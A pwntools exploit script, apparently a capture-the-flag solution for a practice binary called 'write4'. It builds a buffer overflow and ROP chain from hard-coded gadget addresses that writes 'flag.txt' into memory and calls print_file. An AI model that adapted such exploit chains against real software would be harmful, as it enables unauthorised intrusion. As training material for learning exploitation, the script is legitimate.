#!/usr/bin/env python
from pwn import *

#definitions
e = context.binary = ELF('write4')

#prefix
prefix = 40*'A'

#gadgets
pop_r14_r15 = p64(0x400690)
pop_rdi = p64(0x400693)
mov_r14_r15 = p64(0x400628)

#print_file function
print_file = p64(e.symbols.print_file)

#data section
data = p64(0x601028) #vaddr of .data section

#flag.txt
flag = p64(0x7478742e67616c66) #flag.txt in hex (little endian)

#write to register
reg = pop_r14_r15
reg += data + flag
reg += mov_r14_r15

#call function
call = pop_rdi + data + print_file

#payload
payload = prefix + reg + call

#exploit
io = process(e.path)
io.sendline(payload)
io.interactive()
